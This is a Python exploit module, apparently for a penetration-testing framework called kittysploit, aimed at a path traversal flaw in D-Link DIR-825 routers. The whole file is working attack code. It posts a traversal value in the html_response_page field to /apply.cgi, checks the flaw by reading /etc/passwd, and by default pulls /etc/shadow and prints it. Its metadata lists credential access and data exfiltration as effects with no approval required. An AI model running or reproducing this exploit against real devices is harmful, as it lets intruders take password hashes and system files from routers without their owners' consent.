#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-825 Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DIR-825 Path Traversal',
        'description': 'Module exploits D-Link DIR-825 path traversal vulnerability, which allows reading files from the device.',
        'author': ['Samuel Huntley', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/38718/'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/shadow", "File to read")  # file to read
    username = OptString("admin", "Username to log in with")  # username - default: admin
    password = OptString("", "Password to log in with")  # password - default: blank

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            file_path = "..{}".format(self.filename)

            data = {
                "html_response_page": file_path,
                "action": "do_graph_auth",
                "login_name": "test",
                "login_pass": "test1",
                "&login_n": "test2",
                "log_pass": "test3",
                "graph_code": "63778",
                "session_id": "test5",
                "test": "test"
            }

            print_status("Sending request payload using credentials: {} / {}".format(self.username, self.password))
            response = self.http_request(
                method="POST",
                path="/apply.cgi",
                data=data,
                auth=(self.username, self.password)
            )
            if response is None:
                return

            if response.status_code == 200:
                print_status("File: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read response")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        data = {
            "html_response_page": "/etc/passwd",
            "action": "do_graph_auth",
            "login_name": "test",
            "login_pass": "test1",
            "&login_n": "test2",
            "log_pass": "test3",
            "graph_code": "63778",
            "session_id": "test5",
            "test": "test"
        }

        response = self.http_request(
            method="POST",
            path="/apply.cgi",
            data=data,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if ("/etc/passwd" in (response.text or '')):
            return True  # target vulnerable

        return False  # target not vulnerable
